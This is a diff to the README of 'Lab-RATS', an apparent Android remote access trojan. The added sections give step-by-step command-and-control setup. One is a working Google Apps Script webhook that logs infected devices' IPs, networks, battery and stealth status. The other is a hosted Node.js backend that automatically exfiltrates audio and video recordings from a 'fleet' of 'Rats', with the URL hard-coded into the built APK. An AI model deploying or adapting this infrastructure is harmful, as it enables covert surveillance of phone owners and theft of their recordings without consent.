@@ -111,82 +111,44 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 
 ---
 
-## 📊 **Google Sheet Setup Instructions**
+## 📡 Command & Control (C2) Options
 
-1.  **Create** a new **Google Sheet** for **IP Tracking**.
-2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:** *(Supports both GET and POST)*
+Lab-RATS supports two primary methods for tracking your fleet and receiving remote data.
+
+### Option 1: Google Sheet (Standard)
+Best for basic IP tracking and logging. No server maintenance required.
+
+1.  **Create** a new **Google Sheet**.
+2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:**
 
 ```javascript
-function doGet(e) {
-  return handleRequest(e);
-}
-
-function doPost(e) {
-  return handleRequest(e);
-}
-
+function doGet(e) { return handleRequest(e); }
+function doPost(e) { return handleRequest(e); }
 function handleRequest(e) {
   try {
     var ss = SpreadsheetApp.getActiveSpreadsheet();
-    
-    // Check if script is correctly bound to a sheet
-    if (!ss) {
-      return ContentService.createTextOutput("ERROR: Script not bound to a spreadsheet. Create it from WITHIN the Google Sheet (Extensions -> Apps Script)").setMimeType(ContentService.MimeType.TEXT);
-    }
-
-    var sheet = ss.getSheetByName("LabRATS Logs");
-    if (!sheet) {
-      sheet = ss.insertSheet("LabRATS Logs");
-      sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
-    }
-    
-    var data = {};
-    
-    // Handle POST (JSON body)
-    if (e.postData && e.postData.contents) {
-      data = JSON.parse(e.postData.contents);
-    } 
-    // Handle GET (URL parameters)
-    else if (e.parameter) {
-      data = e.parameter;
-    }
-
-    var rowData = [
-      new Date(),
-      data.device || "Unknown",
-      data.network || "Unknown",
-      data.ip || "Unknown",
-      data.port || "Unknown",
-      data.link || "Unknown",
-      data.battery || "Unknown",
-      (data.stealth === true || data.stealth === "true") ? "ACTIVE" : "OFF"
-    ];
-    
-    sheet.appendRow(rowData);
-    return ContentService.createTextOutput("SUCCESS").setMimeType(ContentService.MimeType.TEXT);
-  } catch (err) {
-    return ContentService.createTextOutput("ERROR: " + err.message).setMimeType(ContentService.MimeType.TEXT);
-  }
+    var sheet = ss.getSheetByName("LabRATS Logs") || ss.insertSheet("LabRATS Logs");
+    if (sheet.getLastRow() == 0) sheet.appendRow(["Timestamp", "Device", "Network", "IP", "Port", "Link", "Battery", "Stealth Status"]);
+    var data = (e.postData && e.postData.contents) ? JSON.parse(e.postData.contents) : e.parameter;
+    sheet.appendRow([new Date(), data.device, data.network, data.ip, data.port, data.link, data.battery, data.stealth]);
+    return ContentService.createTextOutput("SUCCESS");
+  } catch (err) { return ContentService.createTextOutput("ERROR: " + err.message); }
 }
 ```
-3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** *(your E-mail)* → **Who has Access: Anyone**.
-4.  **Important**: **Copy** the **Google Sheet Webhook URL** and **prepare to Paste it** into the **apk-builder** tool **when prompted**. *(Next Section)*
+3.  Click **Deploy** → **New Deployment** → **Web App** → **Execute as Me** → **Who has Access: Anyone**.
+4.  Copy the **Webhook URL** for the APK builder.
 
----
+### Option 2: Tactical Node.js Backend (Advanced)
+Best for professional fleet management and **Automatic File Exfiltration**. 
 
-## 📡 C2 Backend Infrastructure (One-Click)
+1.  **Host the Backend**: Use the source code in the `/c2-server` directory. You can host this on platforms like **Render**, **Railway**, or your own VPS.
+2.  **Get your URL**: Once your service is live, copy the URL (e.g., `https://labrats-c2.onrender.com`).
+3.  **Hard-code the Link**: Enter this URL into the **APK Builder** when prompted for the `WEBHOOK_URL`.
 
-> [!IMPORTANT]
-> **GET YOUR URL FIRST**: If you plan to use the centralized dashboard, you MUST click the button below and complete the Render deployment **BEFORE** building your APK. The builder will ask for this URL to hard-code the exfiltration and reporting logic.
-
-Deploy your own private Command & Control hub instantly to manage your fleet and preserve exfiltrated data. The backend features a **Glass-Morphism UI**, **Orbitron typography**, and a **Tactical Exfiltration Vault**.
-
-[![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/K4N3CO/Lab-RATS)
-
-### Tactical Advantages:
-- **Centralized Fleet**: Manage multiple devices from a single glass-morphism dashboard.
-- **Evidence Vault**: Automatically exfiltrate and store audio/video recordings in a secure vault.
-- **Dynamic IP Sync**: Automatic heartbeat reporting ensures your P2P links are always up-to-date.
+**Advantages of Option 2:**
+- 📂 **Exfiltration Vault**: Audio/Video recordings are automatically uploaded and stored on your server.
+- 📡 **Live Fleet List**: A professional glass-morphism dashboard to manage all "Rats" in one place.
+- 🔄 **Dynamic Sync**: Heartbeat reporting ensures your P2P links are always up-to-date.
 
 ---
 
